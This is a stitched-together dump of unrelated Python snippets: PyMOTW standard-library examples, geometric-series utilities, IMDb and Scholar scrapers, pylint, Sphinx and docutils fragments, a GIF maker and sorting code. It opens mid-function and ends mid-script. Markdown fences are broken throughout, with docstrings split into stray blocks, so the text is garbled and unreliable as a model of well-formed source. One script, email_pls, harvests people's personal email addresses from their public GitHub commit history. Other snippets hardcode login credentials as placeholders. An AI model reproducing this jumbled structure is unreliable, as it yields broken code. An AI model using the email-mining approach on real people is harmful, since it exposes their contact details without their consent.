            yield TEXT, "".join(text), (None, -1, -1)
            text = []

        if type in ("StartTag", "EmptyTag"):
            if token["namespace"]:
                name = "{%s}%s" % (token["namespace"], token["name"])
            else:
                name = token["name"]
            attrs = Attrs(
                [
                    (QName("{%s}%s" % attr if attr[0] is not None else attr[1]), value)
                    for attr, value in token["data"].items()
                ]
            )
            yield (START, (QName(name), attrs), (None, -1, -1))
            if type == "EmptyTag":
                type = "EndTag"

        if type == "EndTag":
            if token["namespace"]:
                name = "{%s}%s" % (token["namespace"], token["name"])
            else:
                name = token["name"]

            yield END, QName(name), (None, -1, -1)

        elif type == "Comment":
            yield COMMENT, token["data"], (None, -1, -1)

        elif type == "Doctype":
            yield DOCTYPE, (token["name"], token["publicId"], token["systemId"]), (
                None,
                -1,
                -1,
            )

        else:
            pass  # FIXME: What to do?

    if text:
        yield TEXT, "".join(text), (None, -1, -1)

# Add path, encoding

import math


# Geometric Mean:
# Calculates the geometric mean of
# two numbers
# formula: f(x, y) = square_root(x*y)

geoMean = lambda x, y: math.sqrt(x * y)


while True:
    if input("Start [Y/n]?  ").strip().lower() == "y":
        print(
            " [Res] = "
            + str(geoMean(float(input("\nX? ")), float(input("Y? "))))
            + "\n\n"
        )
    else:
        print("\n\nGoodBye!")
        break
````

````py
GEOMETRIC MEAN :  https://en.wikipedia.org/wiki/Geometric_mean```


```py


def is_geometric_series(series: list) -> bool:
    """
    checking whether the input series is geometric series or not

    >>> is_geometric_series([2, 4, 8])
    True
    >>> is_geometric_series([3, 6, 12, 24])
    True
    >>> is_geometric_series([1, 2, 3])
    False
    >>> is_geometric_series([0, 0, 3])
    False

    """
    if len(series) == 1:
        return True
    try:
        common_ratio = series[1] / series[0]
        for index in range(len(series) - 1):
            if series[index + 1] / series[index] != common_ratio:
                return False
    except ZeroDivisionError:
        return False
    return True


def geometric_mean(series: list) -> float:
    """
    return the geometric mean of series

    >>> geometric_mean([2, 4, 8])
    3.9999999999999996
    >>> geometric_mean([3, 6, 12, 24])
    8.48528137423857
    >>> geometric_mean([4, 8, 16])
    7.999999999999999
    >>> geometric_mean(4)
    Traceback (most recent call last):
        ...
    ValueError: Input series is not valid, valid series - [2, 4, 8]
    >>> geometric_mean([1, 2, 3])
    Traceback (most recent call last):
        ...
    ValueError: Input list is not a geometric series
    >>> geometric_mean([0, 2, 3])
    Traceback (most recent call last):
        ...
    ValueError: Input list is not a geometric series
    >>> geometric_mean([])
    Traceback (most recent call last):
        ...
    ValueError: Input list must be a non empty list

    """
    if not isinstance(series, list):
        raise ValueError("Input series is not valid, valid series - [2, 4, 8]")
    if len(series) == 0:
        raise ValueError("Input list must be a non empty list")
    if not is_geometric_series(series):
        raise ValueError("Input list is not a geometric series")
    answer = 1
    for value in series:
        answer *= value
    return pow(answer, 1 / len(series))


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Simply it just builds a geometric progression on given conditions.
Iterates through t1 till n
multiplies last values in list to constant
append it back to list
COOL!```


```py


def build_geo_sequence(start, end, constant):
    temp = [start]
    try:
        for i in range(start, end):
            temp.append(temp[-1] * constant)
    except TypeError as te:
        print(te)
    except Exception as e:
        print(e)
    else:
        return temp


# Test
res = build_geo_sequence(1, 10, 3)
print("Geo Sequence:")
for i in res:
    print("  " + str(i))
# Expected -> 1, 3, 9, 27, 81, ....
# Here a = 1, d = 3
````

````py
This is a pure Python implementation of the Geometric Series algorithm
https://en.wikipedia.org/wiki/Geometric_series

Run the doctests with the following command:
python3 -m doctest -v geometric_series.py
or
python -m doctest -v geometric_series.py
For manual testing run:
python3 geometric_series.py```


```py


def geometric_series(nth_term: int, start_term_a: int, common_ratio_r: int) -> list:
    """Pure Python implementation of Geometric Series algorithm
    :param nth_term: The last term (nth term of Geometric Series)
    :param start_term_a : The first term of Geometric Series
    :param common_ratio_r : The common ratio between all the terms
    :return: The Geometric Series starting from first term a and multiple of common
        ration with first term with increase in power till last term (nth term)
    Examples:
    >>> geometric_series(4, 2, 2)
    [2, '4.0', '8.0', '16.0']
    >>> geometric_series(4.0, 2.0, 2.0)
    [2.0, '4.0', '8.0', '16.0']
    >>> geometric_series(4.1, 2.1, 2.1)
    [2.1, '4.41', '9.261000000000001', '19.448100000000004']
    >>> geometric_series(4, 2, -2)
    [2, '-4.0', '8.0', '-16.0']
    >>> geometric_series(4, -2, 2)
    [-2, '-4.0', '-8.0', '-16.0']
    >>> geometric_series(-4, 2, 2)
    []
    >>> geometric_series(0, 100, 500)
    []
    >>> geometric_series(1, 1, 1)
    [1]
    >>> geometric_series(0, 0, 0)
    []
    """
    if "" in (nth_term, start_term_a, common_ratio_r):
        return ""
    series = []
    power = 1
    multiple = common_ratio_r
    for _ in range(int(nth_term)):
        if series == []:
            series.append(start_term_a)
        else:
            power += 1
            series.append(str(float(start_term_a) * float(multiple)))
            multiple = pow(float(common_ratio_r), power)
    return series


if __name__ == "__main__":
    nth_term = input("Enter the last number (n term) of the Geometric Series")
    start_term_a = input("Enter the starting term (a) of the Geometric Series")
    common_ratio_r = input(
        "Enter the common ratio between two terms (r) of the Geometric Series"
    )
    print("Formula of Geometric Series => a + ar + ar^2 ... +ar^n")
    print(geometric_series(nth_term, start_term_a, common_ratio_r))

# first: mkdir user && cd user && cp /path/to/get_gists.py .
# python3 get_gists.py user
import requests
import sys
from subprocess import call

user = sys.argv[1]

r = requests.get("https://api.github.com/users/{0}/gists".format(user))

for i in r.json():
    call(["git", "clone", i["git_pull_url"]])

    description_file = "./{0}/description.txt".format(i["id"])
    with open(description_file, "w") as f:
        f.write("{0}\n".format(i["description"]))

#!/usr/bin/env python
# -*- coding: utf8 -*-

import urllib.request
import re
import json
import sys

response = urllib.request.urlopen(
    "https://scholar.google.fr/citations?user={}".format(sys.argv[1])
)
html = response.read()
m = re.search("<tbody(.*)</tbody>", str(html))

mm = re.findall(r"<tr class=\"gsc_a_tr\">(.*?)</tr>", m.group(0))
papers = []
for m in mm:
    xx = re.sub(r"<(.*?)>", r"£", m)
    xx = re.sub(r"£+", r"£", xx)
    yy = re.findall(r"£?(.*?)£", xx)
    paper = {"title": yy[0], "author": yy[1], "booktitle": yy[2]}
    papers.append(paper)

res = {"papers": papers}
print(json.JSONEncoder().encode(res))

def get_attr(obj, name):
    """Emulate built in getattr"""
    if name in obj.__dict__:
        print(f"found {name} in obj")
        return obj.__dict__[name]

    if name in obj.__class__.__dict__:
        print(f"found {name} in class")
        return obj.__class__.__dict__[name]

    for cls in obj.__class__.__mro__:
        if name in cls.__dict__:
            print(f"found {name} in {cls.__name__}")
            return cls.__dict__[name]

    raise AttributeError(name)


class A:
    a = 1


class B(A):
    b = 2

    def __init__(self):
        self.c = 3


b = B()
get_attr(b, "a")
get_attr(b, "b")
get_attr(b, "c")

ideas_to_migrate = []

print("Collecting suggestions...")

# Loop through suggestions and figure out which ones need to be migrated.
for suggestion in suggestions:
    if suggestion["status"]:
        status_type = suggestion["status"]["name"]
        if status_type.lower() != "completed" and status_type.lower() != "declined":
            ideas_to_migrate.append(suggestion)
    else:
        ideas_to_migrate.append(suggestion)

from __future__ import annotations

import csv

import requests
from bs4 import BeautifulSoup


def get_imdb_top_250_movies(url: str = "") -> dict[str, float]:
    url = url or "https://www.imdb.com/chart/top/?ref_=nv_mv_250"
    soup = BeautifulSoup(requests.get(url).text, "html.parser")
    titles = soup.find_all("td", attrs="titleColumn")
    ratings = soup.find_all("td", class_="ratingColumn imdbRating")
    return {
        title.a.text: float(rating.strong.text)
        for title, rating in zip(titles, ratings)
    }


def write_movies(filename: str = "IMDb_Top_250_Movies.csv") -> None:
    movies = get_imdb_top_250_movies()
    with open(filename, "w", newline="") as out_file:
        writer = csv.writer(out_file)
        writer.writerow(["Movie title", "IMDb rating"])
        for title, rating in movies.items():
            writer.writerow([title, rating])


if __name__ == "__main__":
    write_movies()

import requests
from bs4 import BeautifulSoup


def imdb_top(imdb_top_n):
    base_url = (
        f"https://www.imdb.com/search/title?title_type="
        f"feature&sort=num_votes,desc&count={imdb_top_n}"
    )
    source = BeautifulSoup(requests.get(base_url).content, "html.parser")
    for m in source.findAll("div", class_="lister-item mode-advanced"):
        print("\n" + m.h3.a.text)  # movie's name
        print(m.find("span", attrs={"class": "genre"}).text)  # genre
        print(m.strong.text)  # movie's rating
        print(f"https://www.imdb.com{m.a.get('href')}")  # movie's page link
        print("*" * 40)


if __name__ == "__main__":
    imdb_top(input("How many movies would you like to see? "))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Animal(object):
    pass


class Dog(Animal):
    pass


class Husky(Dog):
    pass


a = Animal()
d = Dog()
h = Husky()

print("check a = Animal()...")
print("isinstance(a, Animal) =", isinstance(a, Animal))
print("isinstance(a, Dog) =", isinstance(a, Dog))
print("isinstance(a, Husky) =", isinstance(a, Husky))

print("check d = Dog()...")
print("isinstance(d, Animal) =", isinstance(d, Animal))
print("isinstance(d, Dog) =", isinstance(d, Dog))
print("isinstance(d, Husky) =", isinstance(d, Husky))

print("check h = Husky()...")
print("isinstance(h, Animal) =", isinstance(h, Animal))
print("isinstance(h, Dog) =", isinstance(h, Dog))
print("isinstance(h, Husky) =", isinstance(h, Husky))

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

from glob import glob
from os.path import basename, join, splitext

from pylint.testutils.constants import SYS_VERS_STR


def _get_tests_info(input_dir, msg_dir, prefix, suffix):
    """get python input examples and output messages

    We use following conventions for input files and messages:
    for different inputs:
        test for python  >= x.y    ->  input   =  <name>_pyxy.py
        test for python  <  x.y    ->  input   =  <name>_py_xy.py
    for one input and different messages:
        message for python >=  x.y ->  message =  <name>_pyxy.txt
        lower versions             ->  message with highest num
    """
    result = []
    for fname in glob(join(input_dir, prefix + "*" + suffix)):
        infile = basename(fname)
        fbase = splitext(infile)[0]
        # filter input files :
        pyrestr = fbase.rsplit("_py", 1)[-1]  # like _26 or 26
        if pyrestr.isdigit():  # '24', '25'...
            if pyrestr.isdigit() and int(SYS_VERS_STR) < int(pyrestr):
                continue
        if pyrestr.startswith("_") and pyrestr[1:].isdigit():
            # skip test for higher python versions
            if pyrestr[1:].isdigit() and int(SYS_VERS_STR) >= int(pyrestr[1:]):
                continue
        messages = glob(join(msg_dir, fbase + "*.txt"))
        # the last one will be without ext, i.e. for all or upper versions:
        if messages:
            for outfile in sorted(messages, reverse=True):
                py_rest = outfile.rsplit("_py", 1)[-1][:-4]
                if py_rest.isdigit() and int(SYS_VERS_STR) >= int(py_rest):
                    break
        else:
            # This will provide an error message indicating the missing filename.
            outfile = join(msg_dir, fbase + ".txt")
        result.append((infile, outfile))
    return result

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# type()

print("type(123) =", type(123))
print("type('123') =", type("123"))
print("type(None) =", type(None))
print("type(abs) =", type(abs))

import types

print("type('abc')==str?", type("abc") == str)
````

````py
    getargspec excerpted from:

    sphinx.util.inspect
    ~~~~~~~~~~~~~~~~~~~
    Helpers for inspecting Python modules.
    :copyright: Copyright 2007-2015 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import inspect

# Unmodified from sphinx below this line

from functools import partial


def getargspec(func):
    """Like inspect.getargspec but supports functools.partial as well."""
    if inspect.ismethod(func):
        func = func.__func__
    if type(func) is partial:
        orig_func = func.func
        argspec = getargspec(orig_func)
        args = list(argspec[0])
        defaults = list(argspec[3] or ())
        kwoargs = list(argspec[4])
        kwodefs = dict(argspec[5] or {})
        if func.args:
            args = args[len(func.args) :]
        for arg in func.keywords or ():
            try:
                i = args.index(arg) - len(args)
                del args[i]
                try:
                    del defaults[i]
                except IndexError:
                    pass
            except ValueError:  # must be a kwonly arg
                i = kwoargs.index(arg)
                del kwoargs[i]
                del kwodefs[arg]
        return inspect.FullArgSpec(
            args, argspec[1], argspec[2], tuple(defaults), kwoargs, kwodefs, argspec[6]
        )
    while hasattr(func, "__wrapped__"):
        func = func.__wrapped__
    if not inspect.isfunction(func):
        raise TypeError("%r is not a Python function" % func)
    return inspect.getfullargspec(func)

#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
````

```pyMore complete example which parses and uses the options.

```

````py

# end_pymotw_header
import getopt
import sys

version = "1.0"
verbose = False
output_filename = "default.out"

print("ARGV      :", sys.argv[1:])

try:
    options, remainder = getopt.getopt(
        sys.argv[1:], "o:v", ["output=", "verbose", "version="]
    )
except getopt.GetoptError as err:
    print("ERROR:", err)
    sys.exit(1)

print("OPTIONS   :", options)

for opt, arg in options:
    if opt in ("-o", "--output"):
        output_filename = arg
    elif opt in ("-v", "--verbose"):
        verbose = True
    elif opt == "--version":
        version = arg

print("VERSION   :", version)
print("VERBOSE   :", verbose)
print("OUTPUT    :", output_filename)
print("REMAINING :", remainder)

#!/usr/bin/env python3```


```pyMore complete example which parses and uses the options.```


```py

# end_pymotw_header
import getopt
import sys

version = "1.0"
verbose = False
output_filename = "default.out"

print("ARGV      :", sys.argv[1:])

try:
    options, remainder = getopt.gnu_getopt(
        sys.argv[1:], "o:v", ["output=", "verbose", "version="]
    )
except getopt.GetoptError as err:
    print("ERROR:", err)
    sys.exit(1)

print("OPTIONS   :", options)

for opt, arg in options:
    if opt in ("-o", "--output"):
        output_filename = arg
    elif opt in ("-v", "--verbose"):
        verbose = True
    elif opt == "--version":
        version = arg

print("VERSION   :", version)
print("VERBOSE   :", verbose)
print("OUTPUT    :", output_filename)
print("REMAINING :", remainder)

#!/usr/bin/env python3```


```pyUsing getopt with longer option names.```


```py

# end_pymotw_header
import getopt

opts, args = getopt.getopt(
    ["--noarg", "--witharg", "val", "--witharg2=another"],
    "",
    ["noarg", "witharg=", "witharg2="],
)
for opt in opts:
    print(opt)

#!/usr/bin/env python3```


```pyUsing optparse with single-letter options.```


```py

# end_pymotw_header
import getopt

opts, args = getopt.getopt(["-a", "-bval", "-c", "val"], "ab:c:")

for opt in opts:
    print(opt)

# Copyright 2007 Doug Hellmann.
#```


```pyDefault use of getpass.```


```py

# end_pymotw_header
import getpass

try:
    p = getpass.getpass()
except Exception as err:
    print("ERROR:", err)
else:
    print("You entered:", p)

# Copyright 2007 Doug Hellmann.
#```


```pyUsing read() when there is no tty for getpass() to use.
````

````py

# end_pymotw_header
import getpass
import sys

if sys.stdin.isatty():
    p = getpass.getpass("Using getpass: ")
else:
    print("Using readline")
    p = sys.stdin.readline().rstrip()

print("Read: ", p)

# Copyright 2007 Doug Hellmann.
#```


```pyPassing a prompt to getpass.
````

````py

# end_pymotw_header
import getpass

p = getpass.getpass(prompt="What is your favorite color? ")
if p.lower() == "blue":
    print("Right.  Off you go.")
else:
    print("Auuuuugh!")

# Copyright 2007 Doug Hellmann.
#```


```pyUsing sys.stderr for the prompt lets us redirect stdout.
````

````py

# end_pymotw_header
import getpass
import sys

p = getpass.getpass(stream=sys.stderr)
print("You entered:", p)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py

# flake8: noqa

# end_pymotw_header
import gettext

gettext.install("example", "locale", names=["ngettext"])

print(_("This message is in the script."))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import gettext

# Set up message catalog access
t = gettext.translation("example_domain", "locale", fallback=True)
_ = t.gettext

print(_("This message is in the script."))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import gettext

# Set up message catalog access
t = gettext.translation("example", "locale", fallback=True)
_ = t.gettext

print(_("This message is in the script."))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import gettext

catalogs = gettext.find("example", "locale", all=True)
print("Catalogs:", catalogs)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import gettext

t = gettext.translation("example", "locale", fallback=False)
_ = t.gettext
ngettext = t.ngettext

print(_("This message is in the script."))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
from gettext import translation
import sys

t = translation("plural", "locale", fallback=False)
num = int(sys.argv[1])
msg = t.ngettext("{num} means singular.", "{num} means plural.", num)

# Still need to add the values to the message ourself.
print(msg.format(num=num))
````

````py
Given a non repetitive string s and a set of characters C
How many non-empty substrings of s do not contain every character in C.```


```py
from collections import deque


class Solution:
    def substrings_missing_at_least_one_char(self, s: str, C: set):
        window = {}
        window_size = 0
        start = 0
        count = 0
        for end, c in enumerate(s):
            if c in C:
                if c not in window:
                    window_size += 1
                window[c] = window.get(c, 0) + 1
            while window_size == len(C):
                current_char = s[start]
                if current_char in C:
                    window[current_char] -= 1
                    if not window[current_char]:
                        window_size -= 1
                start += 1
            count += end - start + 1
        return count


s = Solution()
count = s.substrings_missing_at_least_one_char("caab", {"a", "c"})
print(count)

from moviepy.editor import *
from tkinter import *
import moviepy.video.tools.drawing as dw

filepath = "FROZEN Full UK Trailer Official Disney UK.mp4"


def printtext():
    global e, e1
    global string, string1
    string = e.get()
    print(string)
    string1 = e1.get()


def Freezing_a_region():
    Freezing_a_region = (
        VideoFileClip(filepath).subclip((string), (string1)).speedx(0.5).resize(0.4)
    )
    snapshot = (
        Freezing_a_region.crop(x2=Freezing_a_region.w / 2)
        .to_ImageClip(0.2)
        .set_duration(Freezing_a_region.duration)
    )
    composition = CompositeVideoClip([Freezing_a_region, snapshot])
    composition.write_gif("Freezing_a_region.gif", fps=15)


def Cropping_the_image():
    Cropping_the_image = (
        VideoFileClip(filepath)
        .subclip(string, string1)
        .resize(0.5)
        .crop(x1=145, x2=400)
    )
    Cropping_the_image.write_gif("Cropping the image.gif")


def gif_loop():
    castle = (
        VideoFileClip(filepath, audio=False)
        .subclip(string, string1)
        .speedx(0.2)
        .resize(0.4)
    )
    d = castle.duration
    castle = castle.crossfadein(d / 2)
    composition = CompositeVideoClip(
        [castle, castle.set_start(d / 2), castle.set_start(d)]
    ).subclip(d / 2, 3 * d / 2)
    composition.write_gif("castle.gif", fps=5, fuzz=5)


root = Tk()

root.title("Name")

e = Entry(root)
e.pack()
e.focus_set()

e1 = Entry(root)
e1.pack()
e1.focus_set()

b = Button(root, text="okay", command=printtext)
b.pack(side="bottom")
b1 = Button(root, text="Freezing_a_region", command=Freezing_a_region)
b1.pack(side="bottom")
b2 = Button(root, text="Cropping_the_image", command=Cropping_the_image)
b2.pack(side="bottom")
b3 = Button(root, text="gif_loop", command=gif_loop)
b3.pack(side="bottom")
root.mainloop()

print(string1)

# Enter your code here. Read input from STDIN. Print output to STDOUT
s = input()
print(
    *sorted(s, key=lambda x: (x in "02468", x.isdigit(), x.isupper(), x.islower(), x)),
    sep=""
)

import requests
import sys
from subprocess import call

user = sys.argv[1]

r = requests.get("https://api.github.com/users/{0}/gists".format(user))

for i in r.json():
    call(["git", "clone", i["git_pull_url"]])

    description_file = "./{0}/description.txt".format(i["id"])
    with open(description_file, "w") as f:
        f.write("{0}\n".format(i["description"]))

from github import Github
import os
import sys


def email_pls(g, commit):
    users = g.search_users(commit)
    for u in users:
        if (
            u.email is not None
            and u.company is not None
            and u.company.lower() == commit.lower()
        ):
            # 2 ez
            print(u.email, u.name)
        else:
            # thx u git
            user_hist = {}
            events = u.get_public_events()
            for i, e in enumerate(events):
                if i == 15:
                    # look at three items max
                    break
                commits = e.payload.get("commits")
                if commits is None:
                    continue
                else:
                    for j, c in enumerate(commits):
                        if j == 15:
                            break
                        author = c.get("author")
                        if "noreply" in author["email"]:
                            continue
                        if user_hist.get("%s %s" % (author["email"], author["name"])):
                            user_hist["%s %s" % (author["email"], author["name"])] += 1
                        else:
                            user_hist["%s %s" % (author["email"], author["name"])] = 1
            if user_hist:
                # otherwise... u are a ghost
                print(max(user_hist, key=user_hist.get))
    print(g, commit)


if __name__ == "__main__":
    at = os.getenv("GITHUB_TOKEN")
    if at is None:
        u = os.getenv("GITHUB_USERNAME")
        p = os.getenv("GITHUB_PASSWORD")
        if None in [u, p]:
            print("set up access token or username/pw env vars")
            exit(1)
        g = Github(u, p)
    else:
        g = Github(at)
    email_pls(g, sys.argv[1])

from github import Github

# user login
g = Github("username", "password")


# showing all the repositories of python
repos = g.search_repositories(query="language:python")
for i in repos:
    print(i)

# for getting all the repos of user
for repo in g.get_user().get_repos():
    print(repo.name)

# shows the no. of star of the repo
repo = g.get_repo("repository name")
repo.stargazers_count

# getting all the contents of particular repo
content = repo.get_contents("")
for content_fil in content:
    print(content_fil)

# making a repo test and creating test file
user = g.get_user()
repo = user.create_repo("test")
repo.create_file("test.txt", "commit", "hello coders")

# deleting file from the repo
repo = g.get_repo("")  # enter repository name inside the bracket
cont = repo.get_contents("test.txt")
repo.delete_file(cont.path, "remove test", cont.sha, branch="master")
````

````py
    sphinx.ext.githubpages
    ~~~~~~~~~~~~~~~~~~~~~~

    To publish HTML docs at GitHub Pages, create .nojekyll file.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import os
import urllib
from typing import Any, Dict

import sphinx
from sphinx.application import Sphinx
from sphinx.environment import BuildEnvironment


def create_nojekyll_and_cname(app: Sphinx, env: BuildEnvironment) -> None:
    if app.builder.format == "html":
        open(os.path.join(app.builder.outdir, ".nojekyll"), "wt").close()

        html_baseurl = app.config.html_baseurl
        if html_baseurl:
            domain = urllib.parse.urlparse(html_baseurl).hostname
            if domain and not domain.endswith(".github.io"):
                with open(os.path.join(app.builder.outdir, "CNAME"), "wt") as f:
                    # NOTE: don't write a trailing newline. The `CNAME` file that's
                    # auto-generated by the Github UI doesn't have one.
                    f.write(domain)


def setup(app: Sphinx) -> Dict[str, Any]:
    app.connect("env-updated", create_nojekyll_and_cname)
    return {"version": sphinx.__display_version__, "parallel_read_safe": True}

# -*- coding: utf-8 -*-
# Author: David Goodger
# Contact: goodger@users.sourceforge.net
# Revision: $Revision: 2224 $
# Date: $Date: 2004-06-05 21:40:46 +0200 (Sat, 05 Jun 2004) $
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Galician-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    # fixed: language-dependent
    "author": u"Autor",
    "authors": u"Autores",
    "organization": u"Organizaci\u00f3n",
    "address": u"Enderezo",
    "contact": u"Contacto",
    "version": u"Versi\u00f3n",
    "revision": u"Revisi\u00f3n",
    "status": u"Estado",
    "date": u"Data",
    "copyright": u"Dereitos de copia",
    "dedication": u"Dedicatoria",
    "abstract": u"Abstract",
    "attention": u"Atenci\u00f3n!",
    "caution": u"Advertencia!",
    "danger": u"PERIGO!",
    "error": u"Erro",
    "hint": u"Consello",
    "important": u"Importante",
    "note": u"Nota",
    "tip": u"Suxesti\u00f3n",
    "warning": u"Aviso",
    "contents": u"Contido",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    # language-dependent: fixed
    u"autor": "author",
    u"autores": "authors",
    u"organizaci\u00f3n": "organization",
    u"enderezo": "address",
    u"contacto": "contact",
    u"versi\u00f3n": "version",
    u"revisi\u00f3n": "revision",
    u"estado": "status",
    u"data": "date",
    u"dereitos de copia": "copyright",
    u"dedicatoria": "dedication",
    u"abstract": "abstract",
}```


```pyGalician (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

````

`pyThe asterisk as wildcard character.`

```py

# end_pymotw_header
import glob

for name in sorted(glob.glob("dir/*")):
    print(name)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```

`pyUsing character range in patterns.`

```py

# end_pymotw_header
import glob

for name in sorted(glob.glob("dir/*[0-9].*")):
    print(name)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```

`pyThe asterisk as wildcard character.`

```py

# end_pymotw_header
import glob

specials = "?*["

for char in specials:
    pattern = "dir/*" + glob.escape(char) + ".txt"
    print("Searching for: {!r}".format(pattern))
    for name in sorted(glob.glob(pattern)):
        print(name)
    print()

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```

````py
Using glob to find files matching a pattern with a filename
extension.```


```py

# end_pymotw_header
import glob

for name in sorted(glob.glob("*.py")):
    print(name)

#!/usr/bin/env python3```


```pyCreate test data for the glob examples.```


```py
# end_pymotw_header
import os


def mkfile(filename):
    print(filename)
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n")


print("dir")
os.mkdir("dir")

mkfile("dir/file.txt")
mkfile("dir/file1.txt")
mkfile("dir/file2.txt")
mkfile("dir/filea.txt")
mkfile("dir/fileb.txt")
mkfile("dir/file?.txt")
mkfile("dir/file*.txt")
mkfile("dir/file[.txt")

print("dir/subdir")
os.mkdir("dir/subdir")

mkfile("dir/subdir/subfile.txt")

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

````

`pyExample expansion of question mark wild card.`

```py

# end_pymotw_header
import glob

for name in sorted(glob.glob("dir/file?.txt")):
    print(name)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```

`pyListing files in a subdirectory.`

```py

# end_pymotw_header
import glob

print("Named explicitly:")
for name in sorted(glob.glob("dir/subdir/*")):
    print("  {}".format(name))

print("Named with wildcard:")
for name in sorted(glob.glob("dir/*/*")):
    print("  {}".format(name))

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE


from pylint import checkers
from pylint.lint import PyLinter
from pylint.testutils.reporter_for_tests import GenericTestReporter


def create_test_linter():
    test_reporter = GenericTestReporter()
    linter_ = PyLinter()
    linter_.set_reporter(test_reporter)
    linter_.config.persistent = 0
    checkers.initialize(linter_)
    return linter_


# Can't be renamed to a constant (easily), it breaks countless tests
linter = create_test_linter()

from threading import local

_local = local()


def get_current_context(silent=False):
    """Returns the current click context.  This can be used as a way to
    access the current context object from anywhere.  This is a more implicit
    alternative to the :func:`pass_context` decorator.  This function is
    primarily useful for helpers such as :func:`echo` which might be
    interested in changing its behavior based on the current context.

    To push the current context, :meth:`Context.scope` can be used.

    .. versionadded:: 5.0

    :param silent: if set to `True` the return value is `None` if no context
                   is available.  The default behavior is to raise a
                   :exc:`RuntimeError`.
    """
    try:
        return _local.stack[-1]
    except (AttributeError, IndexError):
        if not silent:
            raise RuntimeError("There is no active click context.")


def push_context(ctx):
    """Pushes a new context to the current stack."""
    _local.__dict__.setdefault("stack", []).append(ctx)


def pop_context():
    """Removes the top level from the stack."""
    _local.stack.pop()


def resolve_color_default(color=None):
    """"Internal helper to get the default value of the color flag.  If a
    value is passed it's returned unchanged, otherwise it's looked up from
    the current context.
    """
    if color is not None:
        return color
    ctx = get_current_context(silent=True)
    if ctx is not None:
        return ctx.color

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


class email:
    def __init__(self):
        self.server = smtplib.SMTP_SSL(host="smtp.gmail.com", port=465)
        self.mssg = MIMEMultipart()

    def mail(self, to, sub, msg):

        try:
            self.server.login("email@gmail.com", "password")

            self.mssg["Subject"] = sub
            self.mssg.attach(MIMEText(msg, "plain"))
            text = self.mssg.as_string()
            self.server.sendmail("example@gmail.com", to, text)
            self.server.quit()
            return "Email sent successfully to "
        except:
            return "Sorry, Could Not send the mail to "
```

```py

Gnome Sort
Best case performance is O(n)
Worst case performance is O(n^2)
```

```py


def gnome_sort(arr):
    n = len(arr)
    index = 0
    while index < n:
        if index == 0 or arr[index] >= arr[index - 1]:
            index = index + 1
        else:
            arr[index], arr[index - 1] = arr[index - 1], arr[index]
            index = index - 1
    return arr
```

````py
Fibonacci implementation through golden ratio (math formula).```


```py
import inspect
import math


def get_sequence(n):
    """
    Return Fibonacci sequence from zero
    to specified number as list.
    """
    return sequence(n)


def fib(n):
    """
    Return Fibonacci value by specified number as integer.

    Golden ratio —
    https://en.wikipedia.org/wiki/Golden_ratio
    Fibonacci's relation to the golden ratio —
    https://en.wikipedia.org/wiki/Fibonacci_number#Closed-form_expression
    """
    golden_ratio = (1 + math.sqrt(5)) / 2

    val = (golden_ratio ** n - (1 - golden_ratio) ** n) / math.sqrt(5)

    return int(val)


def sequence(n):
    """
    Return sequence of Fibonacci values as list.
    """
    return [fib(value) for value in range(n + 1)]


def get_code():
    """
    Return source code of Fibonacci sequence logic's implementation.
    """
    return inspect.getsource(get_sequence)

formation_num = 40  # defining no of signs, we are using it on on multiple places
print("*" * formation_num)  # for formation

title = "Python Marksheet"
print(f"\t{title}")
print("-" * formation_num)  # for formation

# student info
name = input("\t Name: ")
roll_no = int(input("\t Roll No: "))

# total marks per subject, assigned multiple variables in one line
mathematics_marks, physics_marks, chemistry_marks, islamiat_marks, urdu_marks = (
    100,
    100,
    100,
    100,
    75,
)

# input
mathematics = int(input(f"\t Mathematics marks out of {mathematics_marks}: "))
chemistry = int(input(f"\t Chemistry marks out of {chemistry_marks}: "))
physics = int(input(f"\t Physics marks out of {physics_marks}: "))
urdu = int(input(f"\t Urdu marks out of {urdu_marks}: "))
islamiat = int(input(f"\t Islamiat marks out of {islamiat_marks}: "))

# calculating total marks, obtained marks and percentage
total_marks = (
    mathematics_marks + physics_marks + chemistry_marks + islamiat_marks + urdu_marks
)
obtained_marks = mathematics + chemistry + physics + urdu + islamiat
percentage = round(obtained_marks / total_marks * 100, 2)  # round to two decimal point

# defining variables for grades
